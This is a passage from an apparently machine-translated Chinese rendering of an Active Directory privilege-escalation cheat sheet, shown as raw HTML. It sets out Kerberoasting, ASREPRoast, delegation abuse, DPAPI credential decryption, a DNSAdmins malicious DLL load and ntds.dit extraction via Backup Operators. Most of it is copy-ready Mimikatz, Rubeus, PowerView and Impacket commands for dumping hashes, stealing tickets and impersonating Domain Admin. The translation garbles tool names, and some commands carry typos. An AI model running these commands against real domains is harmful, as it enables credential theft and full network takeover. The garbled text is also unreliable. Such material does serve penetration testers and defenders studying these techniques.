-SPN</span><span id="b8b4" class="nl kw iq my b gy nq nn l no np">#Get every available SPN account, request a TGS and dump its hash<br/>Invoke-Kerberoast</span><span id="ed47" class="nl kw iq my b gy nq nn l no np">#Requesting the TGS for a single account:<br/>Request-SPNTicket<br/>  <br/>#Export all tickets using Mimikatz<br/>Invoke-Mimikatz -Command '"kerberos::list /export"'</span></pre><ul class=""><li id="d007" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated">广告模块:</li></ul><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="77ad" class="nl kw iq my b gy nm nn l no np">#Get User Accounts that are used as Service Accounts<br/>Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName</span></pre><ul class=""><li id="1e35" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated">插入包:</li></ul><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="ad24" class="nl kw iq my b gy nm nn l no np">python GetUserSPNs.py &lt;DomainName&gt;/&lt;DomainUser&gt;:&lt;Password&gt; -outputfile &lt;FileName&gt;</span></pre><ul class=""><li id="3b9c" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated">鲁伯:</li></ul><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="108b" class="nl kw iq my b gy nm nn l no np">#Kerberoasting and outputing on a file with a spesific format<br/>Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt;</span><span id="5cd5" class="nl kw iq my b gy nq nn l no np">#Kerberoasting whle being "OPSEC" safe, essentially while not try to roast AES enabled accounts<br/>Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /rc4opsec</span><span id="1735" class="nl kw iq my b gy nq nn l no np">#Kerberoast AES enabled accounts<br/>Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /aes<br/> <br/>#Kerberoast spesific user account<br/>Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /user:&lt;username&gt; /simple</span><span id="5c6f" class="nl kw iq my b gy nq nn l no np">#Kerberoast by specifying the authentication credentials <br/>Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /creduser:&lt;username&gt; /credpassword:&lt;password&gt;</span></pre><h1 id="58ad" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">ASREPRoast</h1><p id="358c" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated"><em class="of"> WUT是DIS？:</em> <br/>如果一个域用户帐户不需要kerberos预认证，我们甚至可以在没有域凭证的情况下为该帐户请求一个有效的TGT，提取加密的<br/> blob并强制其离线。</p><ul class=""><li id="401a" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated">PowerView: <code class="fe mv mw mx my b">Get-DomainUser -PreauthNotRequired -Verbose</code></li><li id="8ac4" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">广告模块:<code class="fe mv mw mx my b">Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth</code></li></ul><p id="2b04" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">在我拥有写权限或更多权限的帐户上强制禁用Kerberos预验证！检查帐户上有趣的权限:</p><p id="68d2" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">提示:我们添加了一个过滤器，例如RDPUsers，以获得“用户帐户”而不是机器帐户，因为机器帐户哈希是不可破解的！</p><p id="24d6" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">PowerView:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="dcc9" class="nl kw iq my b gy nm nn l no np">Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}<br/>Disable Kerberos Preauth:<br/>Set-DomainObject -Identity &lt;UserAccount&gt; -XOR @{useraccountcontrol=4194304} -Verbose<br/>Check if the value changed:<br/>Get-DomainUser -PreauthNotRequired -Verbose</span></pre><p id="41d2" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">最后使用<a class="ae mj" href="https://github.com/HarmJ0y/ASREPRoast" rel="noopener ugc nofollow" target="_blank">as repast</a>工具执行攻击。</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="5c0f" class="nl kw iq my b gy nm nn l no np">#Get a spesific Accounts hash:<br/>Get-ASREPHash -UserName &lt;UserName&gt; -Verbose</span><span id="8136" class="nl kw iq my b gy nq nn l no np">#Get any ASREPRoastable Users hashes:<br/>Invoke-ASREPRoast -Verbose</span></pre><p id="1458" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">使用红色:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="14ba" class="nl kw iq my b gy nm nn l no np">#Trying the attack for all domain users<br/>Rubeus.exe asreproast /format:&lt;hashcat|john&gt; /domain:&lt;DomainName&gt; /outfile:&lt;filename&gt;</span><span id="6aa7" class="nl kw iq my b gy nq nn l no np">#ASREPRoast spesific user<br/>Rubeus.exe asreproast /user:&lt;username&gt; /format:&lt;hashcat|john&gt; /domain:&lt;DomainName&gt; /outfile:&lt;filename&gt;</span><span id="be4d" class="nl kw iq my b gy nq nn l no np">#ASREPRoast users of a spesific OU (Organization Unit)<br/>Rubeus.exe asreproast /ou:&lt;OUName&gt; /format:&lt;hashcat|john&gt; /domain:&lt;DomainName&gt; /outfile:&lt;filename&gt;</span></pre><p id="9f05" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">使用Impacket:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="5448" class="nl kw iq my b gy nm nn l no np">#Trying the attack for the specified users on the file<br/>python GetNPUsers.py &lt;domain_name&gt;/ -usersfile &lt;users_file&gt; -outputfile &lt;FileName&gt;</span></pre><h1 id="93ac" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">密码喷雾攻击</h1><p id="dd72" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated">如果我们通过泄露用户帐户获得了一些密码，我们可以使用这种方法来尝试和利用其他域帐户上的密码重用。</p><p id="ac65" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">工具:</p><ul class=""><li id="bf75" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/dafthack/DomainPasswordSpray" rel="noopener ugc nofollow" target="_blank">域名密码祈祷</a></li><li id="927d" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/byt3bl33d3r/CrackMapExec" rel="noopener ugc nofollow" target="_blank"> CrackMapExec </a></li><li id="c3e6" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/wavestone-cdt/Invoke-CleverSpray" rel="noopener ugc nofollow" target="_blank">调用-CleverSpray </a></li><li id="78f7" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/Greenwolf/Spray" rel="noopener ugc nofollow" target="_blank">喷</a></li></ul><h1 id="a3f5" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">强制设置SPN</h1><p id="0dc8" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated"><em class="of"> WUT是DIS？:如果我们有足够的权限- &gt; GenericAll/GenericWrite我们可以在一个目标帐户上设置一个SPN，请求一个TGS，然后抓取它的blob并强制执行。</em></p><ul class=""><li id="62ce" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated">PowerView:</li></ul><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="f7ad" class="nl kw iq my b gy nm nn l no np">#Check for interesting permissions on accounts:<br/>Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}<br/> <br/>#Check if current user has already an SPN setted:<br/>Get-DomainUser -Identity &lt;UserName&gt; | select serviceprincipalname<br/> <br/>#Force set the SPN on the account:<br/>Set-DomainObject &lt;UserName&gt; -Set @{serviceprincipalname='ops/whatever1'}</span></pre><ul class=""><li id="df1d" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated">广告模块:</li></ul><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="ba32" class="nl kw iq my b gy nm nn l no np">#Check if current user has already an SPN setted<br/>Get-ADUser -Identity &lt;UserName&gt; -Properties ServicePrincipalName | select ServicePrincipalName<br/>  <br/>#Force set the SPN on the account:<br/>Set-ADUser -Identiny &lt;UserName&gt; -ServicePrincipalNames @{Add='ops/whatever1'}</span></pre><p id="7832" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">最后，使用之前的任何工具获取hash并进行kerberoast认证！</p><h1 id="909f" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">滥用卷影副本</h1><p id="a96b" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated">如果您在一台机器上有本地管理员权限，请尝试列出卷影副本，这是一种简单的域升级方法。</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="724d" class="nl kw iq my b gy nm nn l no np">#List shadow copies using vssadmin (Needs Admnistrator Access)<br/>vssadmin list shadows<br/>  <br/>#List shadow copies using diskshadow<br/>diskshadow list shadows all<br/>  <br/>#Make a symlink to the shadow copy and access it<br/>mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\</span></pre><ol class=""><li id="7f71" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi og ms mt mu bi translated">您可以转储备份的SAM数据库并收集凭据。</li><li id="8aa7" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi og ms mt mu bi translated">查找DPAPI存储的凭证并解密它们。</li><li id="07f8" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi og ms mt mu bi translated">访问备份的敏感文件。</li></ol><h1 id="3321" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">使用Mimikatz列出并解密存储的凭证</h1><p id="6cfe" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated">通常，加密的凭据存储在:</p><ul class=""><li id="2256" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated"><code class="fe mv mw mx my b">%appdata%\Microsoft\Credentials</code></li><li id="be0a" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><code class="fe mv mw mx my b">%localappdata%\Microsoft\Credentials</code></li></ul><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="a010" class="nl kw iq my b gy nm nn l no np">#By using the cred function of mimikatz we can enumerate the cred object and get information about it:<br/>dpapi::cred /in:"%appdata%\Microsoft\Credentials\&lt;CredHash&gt;"</span><span id="f080" class="nl kw iq my b gy nq nn l no np">#From the previous command we are interested to the "guidMasterKey" parameter, that tells us which masterkey was used to encrypt the credential<br/>#Lets enumerate the Master Key:<br/>dpapi::masterkey /in:"%appdata%\Microsoft\Protect\&lt;usersid&gt;\&lt;MasterKeyGUID&gt;"</span><span id="b39d" class="nl kw iq my b gy nq nn l no np">#Now if we are on the context of the user (or system) that the credential belogs to, we can use the /rpc flag to pass the decryption of the masterkey to the domain controler:<br/>dpapi::masterkey /in:"%appdata%\Microsoft\Protect\&lt;usersid&gt;\&lt;MasterKeyGUID&gt;" /rpc</span><span id="a0df" class="nl kw iq my b gy nq nn l no np">#We now have the masterkey in our local cache:<br/>dpapi::cache</span><span id="bb89" class="nl kw iq my b gy nq nn l no np">#Finally we can decrypt the credential using the cached masterkey:<br/>dpapi::cred /in:"%appdata%\Microsoft\Credentials\&lt;CredHash&gt;"</span></pre><p id="3ebc" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">详细文章:<a class="ae mj" href="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials" rel="noopener ugc nofollow" target="_blank"> DPAPI所有的东西</a></p><h1 id="5120" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">不受限制的委托</h1><p id="41f0" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated"><em class="of"> WUT是DIS？:如果我们在启用了无约束委派的机器上具有管理访问权限，我们可以等待高价值目标或DA连接到该机器，窃取他的TGT，然后进行ptt并冒充他！</em></p><p id="00ed" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">使用PowerView:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="519c" class="nl kw iq my b gy nm nn l no np">#Discover domain joined computers that have Unconstrained Delegation enabled<br/>Get-NetComputer -UnConstrained</span><span id="5e87" class="nl kw iq my b gy nq nn l no np">#List tickets and check if a DA or some High Value target has stored its TGT<br/>Invoke-Mimikatz -Command '"sekurlsa::tickets"'</span><span id="6e8a" class="nl kw iq my b gy nq nn l no np">#Command to monitor any incoming sessions on our compromised server<br/>Invoke-UserHunter -ComputerName &lt;NameOfTheComputer&gt; -Poll &lt;TimeOfMonitoringInSeconds&gt; -UserName &lt;UserToMonitorFor&gt; -Delay   <br/>&lt;WaitInterval&gt; -Verbose</span><span id="6355" class="nl kw iq my b gy nq nn l no np">#Dump the tickets to disk:<br/>Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'</span><span id="2af8" class="nl kw iq my b gy nq nn l no np">#Impersonate the user using ptt attack:<br/>Invoke-Mimikatz -Command '"kerberos::ptt &lt;PathToTicket&gt;"'</span></pre><p id="e8b0" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">注意:我们也可以用鲁伯！</p><h1 id="dbee" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">受约束的委托</h1><p id="0b6e" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated">使用PowerView和Kekeo:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="17fa" class="nl kw iq my b gy nm nn l no np">#Enumerate Users and Computers with constrained delegation<br/>Get-DomainUser -TrustedToAuth<br/>Get-DomainComputer -TrustedToAuth</span><span id="453a" class="nl kw iq my b gy nq nn l no np">#If we have a user that has Constrained delegation, we ask for a valid tgt of this user using kekeo<br/>tgt::ask /user:&lt;UserName&gt; /domain:&lt;Domain's FQDN&gt; /rc4:&lt;hashedPasswordOfTheUser&gt;</span><span id="e6f7" class="nl kw iq my b gy nq nn l no np">#Then using the TGT we have ask a TGS for a Service this user has Access to through constrained delegation<br/>tgs::s4u /tgt:&lt;PathToTGT&gt; /user:&lt;UserToImpersonate&gt;@&lt;Domain's FQDN&gt; /service:&lt;Service's SPN&gt;</span><span id="329e" class="nl kw iq my b gy nq nn l no np">#Finally use mimikatz to ptt the TGS<br/>Invoke-Mimikatz -Command '"kerberos::ptt &lt;PathToTGS&gt;"'</span></pre><p id="d7b6" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated"><em class="of">替代:</em>使用红色:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="b42b" class="nl kw iq my b gy nm nn l no np">Rubeus.exe s4u /user:&lt;UserName&gt; /rc4:&lt;NTLMhashedPasswordOfTheUser&gt; /impersonateuser:&lt;UserToImpersonate&gt; /msdsspn:"&lt;Service's SPN&gt;" /altservice:&lt;Optional&gt; /ptt</span></pre><p id="be9c" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">现在我们可以以模拟用户的身份访问服务了！</p><p id="512e" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">🚩如果我们只有一个特定的SPN的委托权限会怎么样？(例如时间):</p><p id="d028" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">在这种情况下，我们仍然可以滥用kerberos的一个称为“替代服务”的特性。这使得我们可以请求TGS其他“替代”服务的门票，而不仅仅是我们有权利的服务。这使我们能够为主机支持的任何服务请求有效的票证，使我们能够完全访问目标机器。</p><h1 id="f2b1" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">基于资源的受限委托</h1><p id="06fd" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated"><em class="of"> WUT是DIS？:<br/>TL；如果我们在一个域的机器帐户对象上有GenericALL/GenericWrite特权，我们就可以滥用它，并把我们自己冒充成这个域的任何用户。例如，我们可以模拟域管理员并拥有完全的访问权限。</em></p><p id="355a" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">我们将使用的工具:</p><ul class=""><li id="4810" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon" rel="noopener ugc nofollow" target="_blank"> PowerView </a></li><li id="9b9d" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/Kevin-Robertson/Powermad" rel="noopener ugc nofollow" target="_blank">动力狂</a></li><li id="0226" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/GhostPack/Rubeus" rel="noopener ugc nofollow" target="_blank">红色</a></li></ul><p id="3233" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">首先，我们需要输入对该对象拥有权限的用户/机器帐户的安全上下文。如果这是一个用户帐户，我们可以使用通过哈希，RDP，PSCredentials等。</p><p id="b6df" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">利用示例:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="1d3f" class="nl kw iq my b gy nm nn l no np">#Import Powermad and use it to create a new MACHINE ACCOUNT<br/>. .\Powermad.ps1<br/>New-MachineAccount -MachineAccount &lt;MachineAccountName&gt; -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose</span><span id="23d3" class="nl kw iq my b gy nq nn l no np">#Import PowerView and get the SID of our new created machine account<br/>. .\PowerView.ps1<br/>$ComputerSid = Get-DomainComputer &lt;MachineAccountName&gt; -Properties objectsid | Select -Expand objectsid</span><span id="ddab" class="nl kw iq my b gy nq nn l no np">#Then by using the SID we are going to build an ACE for the new created machine account using a raw security descriptor:<br/>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"<br/>$SDBytes = New-Object byte[] ($SD.BinaryLength) <br/>$SD.GetBinaryForm($SDBytes, 0)</span><span id="6741" class="nl kw iq my b gy nq nn l no np">#Next, we need to set the security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView<br/>Get-DomainComputer TargetMachine | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose</span><span id="d194" class="nl kw iq my b gy nq nn l no np">#After that we need to get the RC4 hash of the new machine account's password using Rubeus<br/>Rubeus.exe hash /password:'p@ssword!'</span><span id="f4af" class="nl kw iq my b gy nq nn l no np">#And for this example, we are going to impersonate Domain Administrator on the cifs service of the target computer using Rubeus<br/>Rubeus.exe s4u /user:&lt;MachineAccountName&gt; /rc4:&lt;RC4HashOfMachineAccountPassword&gt; /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:wtver.domain /ptt</span><span id="889f" class="nl kw iq my b gy nq nn l no np">#Finally we can access the C$ drive of the target machine<br/>dir \\TargetMachine.wtver.domain\C$</span></pre><p id="4a1f" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">详细文章:</p><ul class=""><li id="0f00" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated"><a class="ae mj" href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html" rel="noopener ugc nofollow" target="_blank">顾全大局:滥用基于资源的约束委托攻击活动目录</a></li><li id="3d06" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/" rel="noopener ugc nofollow" target="_blank">基于资源的受限委托滥用</a></li></ul><p id="6272" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">约束和基于资源的约束委托中的❗如果我们没有试图滥用的TRUSTED_TO_AUTH_FOR_DELEGATION帐户的密码/哈希，我们可以使用kekeo的“tgt::deleg”或rubeus的“tgtdeleg”这一非常好的技巧，骗过Kerberos给我们一个该帐户的有效tgt。然后，我们只需使用票证而不是帐户的哈希来执行攻击。</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="b0e3" class="nl kw iq my b gy nm nn l no np">#Command on Rubeus<br/>Rubeus.exe tgtdeleg /nowrap</span></pre><p id="b718" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">详细文章:<a class="ae mj" href="https://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/" rel="noopener ugc nofollow" target="_blank">rube us——现在有更多Kekeo </a></p><h1 id="c42c" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">滥用DNSAdmins</h1><p id="4093" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated">WUT是迪斯？:如果用户是DNSAdmins组的成员，他可能会以dns.exe的权限加载任意DLL，作为SYSTEM运行。如果DC为DNS提供服务，用户可以将其权限提升至DA。该攻击过程需要重新启动DNS服务的权限才能运行。</p><ol class=""><li id="32f9" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi og ms mt mu bi translated">枚举DNSAdmins组的成员:</li></ol><ul class=""><li id="81f4" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated">PowerView: <code class="fe mv mw mx my b">Get-NetGroupMember -GroupName "DNSAdmins"</code></li><li id="836d" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">广告模块:<code class="fe mv mw mx my b">Get-ADGroupMember -Identiny DNSAdmins</code></li></ul><ol class=""><li id="4bd2" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi og ms mt mu bi translated">一旦我们找到了这个群体中的一员，我们就需要妥协(有很多方法)。</li><li id="85e4" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi og ms mt mu bi translated">然后，通过在SMB共享上提供恶意dll并配置DLL使用，我们可以提升我们的权限:</li></ol><ul class=""><li id="717d" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated"><code class="fe mv mw mx my b">#Using dnscmd: dnscmd &lt;NameOfDNSMAchine&gt; /config /serverlevelplugindll \\Path\To\Our\Dll\malicious.dll #Restart the DNS Service: sc \\DNSServer stop dns sc \\DNSServer start dns</code></li></ul><h1 id="eb68" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">滥用活动目录集成的DNS</h1><ul class=""><li id="c7f0" class="mk ml iq lp b lq lr lt lu lw nr ma ns me nt mi mr ms mt mu bi translated"><a class="ae mj" href="https://blog.netspi.com/exploiting-adidns/" rel="noopener ugc nofollow" target="_blank">利用集成活动目录的DNS </a></li><li id="5ef5" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://blog.netspi.com/adidns-revisited/" rel="noopener ugc nofollow" target="_blank">再次访问ADI DNS</a></li><li id="c865" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/Kevin-Robertson/Inveigh" rel="noopener ugc nofollow" target="_blank">漫骂</a></li></ul><h1 id="b4c6" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">滥用备份操作员组</h1><p id="2724" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated"><em class="of"> WUT是DIS？:如果我们设法侵入属于Backup Operators组成员的用户帐户，我们就可以滥用其权限来创建DC当前状态的卷影副本，提取ntds.dit数据库文件，转储哈希并将我们的权限升级到DA。</em></p><ol class=""><li id="ecdf" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi og ms mt mu bi translated">一旦我们获得了拥有SeBackupPrivilege的帐户的访问权限，我们就可以访问DC并使用签名的二进制磁盘创建卷影副本卷影:</li></ol><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="3a81" class="nl kw iq my b gy nm nn l no np">#Create a .txt file that will contain the shadow copy process script<br/>Script -&gt;{<br/>set context persistent nowriters  <br/>set metadata c:\windows\system32\spool\drivers\color\example.cab  <br/>set verbose on  <br/>begin backup  <br/>add volume c: alias mydrive  <br/> <br/>create  <br/>  <br/>expose %mydrive% w:  <br/>end backup  <br/>}</span><span id="6909" class="nl kw iq my b gy nq nn l no np">#Execute diskshadow with our script as parameter<br/>diskshadow /s script.txt</span></pre><ol class=""><li id="d2ef" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi og ms mt mu bi translated">接下来，我们需要访问卷影副本，我们可能有SeBackupPrivilege，但我们不能简单地复制粘贴ntds.dit，我们需要模拟备份软件，并使用Win32 API调用将其复制到可访问的文件夹中。为此，我们将使用<a class="ae mj" href="https://github.com/giuliano108/SeBackupPrivilege" rel="noopener ugc nofollow" target="_blank">这个</a>惊人的回购:</li></ol><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="48dc" class="nl kw iq my b gy nm nn l no np">#Importing both dlls from the repo using powershell<br/>Import-Module .\SeBackupPrivilegeCmdLets.dll<br/>Import-Module .\SeBackupPrivilegeUtils.dll<br/>  <br/>#Checking if the SeBackupPrivilege is enabled<br/>Get-SeBackupPrivilege<br/>  <br/>#If it isn't we enable it<br/>Set-SeBackupPrivilege<br/>  <br/>#Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice<br/>Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\&lt;PathToSave&gt;\ntds.dit -Overwrite<br/>  <br/>#Dump the SYSTEM hive<br/>reg save HKLM\SYSTEM c:\temp\system.hive</span></pre><ol class=""><li id="173d" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi og ms mt mu bi translated">使用impacket或其他工具中的smbclient.py，我们在本地机器上复制ntds.dit和SYSTEM hive。</li><li id="cb82" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi og ms mt mu bi translated">使用impacket中的secretsdump.py并转储哈希。</li><li id="a21d" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi og ms mt mu bi translated">使用psexec或您选择的其他工具来PTH并获得域管理员访问权限。</li></ol><h1 id="2df2" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">滥用交换</h1><ul class=""><li id="cb41" class="mk ml iq lp b lq lr lt lu lw nr ma ns me nt mi mr ms mt mu bi translated"><a class="ae mj" href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/" rel="noopener ugc nofollow" target="_blank">滥用来自DA的Exchange one Api调用</a></li><li id="f782" class="mk ml iq lp b 